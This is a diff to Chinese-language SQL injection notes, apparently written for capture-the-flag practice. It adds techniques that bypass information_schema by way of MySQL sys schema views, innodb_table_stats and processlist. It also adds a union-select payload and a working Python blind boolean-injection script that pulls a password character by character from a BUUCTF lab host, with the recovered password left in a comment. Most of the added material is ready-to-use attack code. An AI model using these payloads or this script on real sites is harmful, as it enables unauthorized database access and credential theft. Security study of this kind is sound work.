@@ -257,7 +257,7 @@ id=1^if(ascii(substr(database(),1,1))=102,2,3)
 
 # bypass infromation_schema
 
-**由于performance_schema过于发杂，所以mysql在5.7版本中新增了sys schemma，基础数据来自于performance_chema和information_schema两个库，本身数据库不存储数据。**
+**由于performance_schema过于复杂，所以mysql在5.7版本中新增了sys schemma，基础数据来自于performance_chema和information_schema两个库，本身数据库不存储数据。**
 
 **schema_auto_increment_columns**，该视图的作用简单来说就是用来对表自增ID的监控,也可以发现我们可以通过该视图获取数据库的表名信息
 
@@ -268,12 +268,39 @@ id=1^if(ascii(substr(database(),1,1))=102,2,3)
 
 **sys.schema_table_statistics_with_buffer**
    可以看到，在上一个视图中并没有出现的表名在这里出现。
+
 ```
 ?id=-1' union all select 1,2,group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database()--+
 ```
 ```
 select /**/ group_concat(table_name) /**/ from /**/ mysql.innodb_table_stats
 ```
+
+
+
+**利用`processlist`表读取正在执行的sql语句，从而得到表名与列名**
+
+<img src="http://img.npfs06.top/20210723105353.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10" style="zoom:70%;" />
+
+例子：
+
+```python
+import requests
+url = "http://9ea19d02-b943-4a06-9d06-ee9e316803a0.node4.buuoj.cn/"
+for n in range(0,150):
+    for i in range(31,300):
+        # payload = "if((ascii(substr((select (info)  FROM information_schema.processlist limit 0,1)," + str( n + 1) + ",1)) in (" + str(i) + ")),1,0)"
+        #SELECT qwbqwbqwbuser,qwbqwbqwbpass from qwbtttaaab111e where qwbqwbqwbuser='andmin'
+        payload = "if((ascii(substr((select qwbqwbqwbpass FROM qwbtttaaab111e limit 0,1)," + str(n + 1) + ",1)) in (" + str(i) + ")),1,0)"
+        #glzjin666888
+        r = requests.get(url + "register.php?username=admin' and " + payload + " and '1&password=1")
+        if ("username" in r.text):
+            print(chr(i), end="")
+            break
+        elif("success" not in r.text):
+            print("n= "+str(n)+" i= "+str(i)+"|"+r.text)
+```
+
 
 
 # substr(database() from 1 for 2)
